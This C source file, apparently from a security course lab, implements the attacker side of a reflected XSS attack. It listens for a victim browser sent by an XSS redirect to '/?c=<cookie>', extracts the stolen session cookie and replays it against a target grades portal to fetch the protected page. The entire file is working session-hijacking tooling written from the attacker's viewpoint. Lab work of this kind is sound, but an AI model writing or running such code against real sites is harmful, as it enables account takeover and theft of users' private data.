// ex3_reflected.c
// attacker "mini web server" that waits for the victim browser to hit us with ?c=<cookie>
// listen for /?c=<cookie> then use it to GET the target page and save raw response

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define LISTEN_PORT 8000               // where the victim browser will call back (our listener)
#define WEB_SERVER_IP   "192.168.1.203"// target web server (victim site)
#define WEB_SERVER_PORT 80
#define TARGET_PATH  "/gradesPortal.php" // page we want to fetch with stolen session
#define OUTPUT_FILE  "spoofed-reflected.txt" // save the raw HTTP response here
#define CAPTURED_FILE "captured.txt"   // (not used here, but kept for debugging option)
#define CAPTURE_PARAM "c"              // we expect /?c=... from the payload
#define REQ_MAX   32768                // big buffer for incoming HTTP headers
#define IO_BUFSZ  4096                 // stream read chunk size (response size unknown)

// set required socket options
static int apply_required_sockopts(int fd) {
  int opt = 1;

  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, (socklen_t)sizeof(opt)) < 0) {
    (void)close(fd);
    return -1;
  }

  opt = 1;
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &opt, (socklen_t)sizeof(opt)) < 0) {
    (void)close(fd);
    return -1;
  }
  return 0;
}

// create a TCP listener on LISTEN_PORT (victim browser connects here)
static int make_listener(uint16_t port) {
  int fd = socket(AF_INET, SOCK_STREAM, 0); // create TCP socket
  if (fd < 0) return -1;

  if (apply_required_sockopts(fd) < 0) return -1; // apply flags by staff

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = htonl(INADDR_ANY); // listen on all interfaces

  if (bind(fd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
    (void)close(fd);
    return -1;
  }

  if (listen(fd, 1) < 0) { // start listening (we only expect one victim hit)
    (void)close(fd);
    return -1;
  }

  return fd;
}

// connect to the real web server (we do it after stealing the cookie)
static int connect_tcp(const char *ip, uint16_t port) {
  int fd = socket(AF_INET, SOCK_STREAM, 0); // create client TCP socket
  if (fd < 0) return -1;

  if (apply_required_sockopts(fd) < 0) return -1; // apply flags by staff

  struct sockaddr_in addr; // build destination address
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);

  if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
    (void)close(fd);
    return -1;
  }

  if (connect(fd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
    (void)close(fd);
    return -1;
  }

  return fd;
}

// check if we already got "\r\n\r\n" (end of HTTP headers)
static bool has_header_end(const char *buf, size_t len) {
  if (len < 4) return false; // HTTP headers end with "\r\n\r\n"
  for (size_t i = 0; i + 3 < len; i++) { // scan buffer for the sequence
    if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
      return true;
    }
  }
  return false;
}

// read only the HTTP headers (we don't care about body from victim browser)
static ssize_t read_http_headers(int fd, char *buf, size_t buf_sz) {
  size_t used = 0;

  while (used + 1 < buf_sz) { // read until we see header end OR buffer full OR socket closes
    ssize_t n = read(fd, buf + used, (buf_sz - 1) - used);
    if (n <= 0) break;
    used += (size_t)n;

    if (has_header_end(buf, used)) break; // got full headers
  }

  buf[used < buf_sz ? used : (buf_sz - 1)] = '\0'; // make it a valid string for parsing with strchr/strncmp
  return (ssize_t)used;
}


// helper: write everything (no partial sends)
static void write_all(int fd, const char *buf, size_t len) {
  size_t off = 0;
  // write() can be partial, so loop until all is sent
  while (off < len) {
    ssize_t w = write(fd, buf + off, len - off);
    if (w <= 0) return;
    off += (size_t)w;
  }
}

// hex char -> int (for %HH decoding)
static int hex_val(char c) {
  // convert a single hex char to 0..15
  if (c >= '0' && c <= '9') return (int)(c - '0');
  if (c >= 'a' && c <= 'f') return (int)(c - 'a' + 10);
  if (c >= 'A' && c <= 'F') return (int)(c - 'A' + 10);
  return -1;
}

// in-place URL decode: '+' -> space, %HH -> byte
static void url_decode_inplace(char *s) {
  // decode "+", and "%HH" in place (so we can read cookie as normal text)
  size_t r = 0, w = 0;
  while (s[r] != '\0') {
    if (s[r] == '+') {
      s[w++] = ' ';
      r++;
      continue;
    }
    if (s[r] == '%' && s[r + 1] != '\0' && s[r + 2] != '\0') {
      int hi = hex_val(s[r + 1]);
      int lo = hex_val(s[r + 2]);
      if (hi >= 0 && lo >= 0) {
        s[w++] = (char)((hi << 4) | lo);
        r += 3;
        continue;
      }
    }
    s[w++] = s[r++]; // normal char, just copy it
  }
  s[w] = '\0';
}

// pull a specific query param from a path like "/?c=...&x=..."
// output is URL-decoded
static bool extract_query_param(const char *path, const char *key, char *out, size_t out_sz) {
  const char *q = strchr(path, '?'); // find query string start '?'
  if (q == NULL) return false;
  q++;

  size_t key_len = strlen(key);
  const char *p = q;

  // loop over "k=v&k2=v2..."
  while (*p != '\0') {
    // check if current chunk starts with "key="
    if (strncmp(p, key, key_len) == 0 && p[key_len] == '=') {
      const char *val = p + key_len + 1;

      // stop at '&' or space (space shows up before HTTP/1.1 sometimes)
      const char *end = strpbrk(val, "& ");
      size_t len = (end == NULL) ? strlen(val) : (size_t)(end - val);

      // safety: make sure it fits our output buffer
      if (len + 1 > out_sz) return false;

      // copy raw value then URL-decode it
      memcpy(out, val, len);
      out[len] = '\0';
      url_decode_inplace(out);
      return true;
    }

    // move to next param chunk (after '&')
    const char *amp = strchr(p, '&');
    if (amp == NULL) break;
    p = amp + 1;
  }
  return false;
}

// stream-read everything from fd and dump to a file (raw bytes)
static void save_stream_to_file(int fd, const char *filename) {
  // dump everything we read until server closes (raw HTTP response)
  FILE *f = fopen(filename, "wb");
  if (f == NULL) return;

  char buf[IO_BUFSZ];

  // keep reading until EOF
  while (1) {
    ssize_t n = read(fd, buf, sizeof(buf));
    if (n <= 0) break;
    (void)fwrite(buf, 1, (size_t)n, f);
  }

  (void)fclose(f);
}

// build a GET request to TARGET_PATH and save the full response to OUTPUT_FILE
// extra_headers is usually "Cookie: ...\r\n"
static void fetch_page_raw_to_file(const char *extra_headers) {
  // connect to the victim web server and request the protected page
  int s = connect_tcp(WEB_SERVER_IP, (uint16_t)WEB_SERVER_PORT);
  if (s < 0) return;

  // build GET request + injected Cookie header
  char req[4096];
  int n = snprintf(req, sizeof(req),
                   "GET %s HTTP/1.1\r\n"
                   "Host: %s\r\n"
                   "Connection: close\r\n"
                   "%s"
                   "\r\n",
                   TARGET_PATH, WEB_SERVER_IP, (extra_headers != NULL) ? extra_headers : ""
  );
  if (n <= 0) { (void)close(s); return; }

  // send request
  write_all(s, req, (size_t)n);

  // Important: unknown size => stream until EOF
  // response size unknown => read until server closes
  save_stream_to_file(s, OUTPUT_FILE);
  (void)close(s);
}

int main(void) {
  // 1) wait for victim's browser to call our listener (the XSS redirect)
  int lfd = make_listener((uint16_t)LISTEN_PORT);
  if (lfd < 0) return 0;

  int cfd = accept(lfd, NULL, NULL); // one connection is enough
  if (cfd < 0) { close(lfd); return 0; }

  // 2) read the victim request headers (we only need the first line/path)
  char req[REQ_MAX];
  if (read_http_headers(cfd, req, sizeof(req)) < 0) {
    close(cfd); close(lfd); return 0;
  }

  // 3) parse the URL path and extract ?c=<cookie>
  char captured_cookie[2048] = {0};

  // request line looks like: "GET /?c=... HTTP/1.1"
  const char *sp1 = strchr(req, ' ');
  if (sp1 != NULL) {
    const char *sp2 = strchr(sp1 + 1, ' ');
    if (sp2 != NULL) {
      // copy just the path part into its own buffer

      char path[REQ_MAX] = {0};
      size_t plen = (size_t)(sp2 - (sp1 + 1));
      if (plen < sizeof(path)) {
        memcpy(path, sp1 + 1, plen);
        path[plen] = '\0';

        // try to get CAPTURE_PARAM=c from the path
        extract_query_param(path, CAPTURE_PARAM, captured_cookie, sizeof(captured_cookie));
      }
    }
  }

  // 4) reply "OK" so the browser closes cleanly (so it doesn't hang)
  const char *resp = "HTTP/1.1 200 OK\r\n"
                     "Connection: close\r\n"
                     "Content-Type: text/plain\r\n"
                     "Content-Length: 2\r\n\r\n"
                     "OK";
  write_all(cfd, resp, strlen(resp));
  close(cfd);
  close(lfd);

  // 5) if we got a cookie, reuse it as a Cookie header and fetch the protected page
  if (captured_cookie[0] != '\0') {
    char cookie_header[2560];
    // captured_cookie is expected to be something like "PHPSESSID=...."
    snprintf(cookie_header, sizeof(cookie_header), "Cookie: %s\r\n", captured_cookie);
    fetch_page_raw_to_file(cookie_header);
  }

  return 0;
}
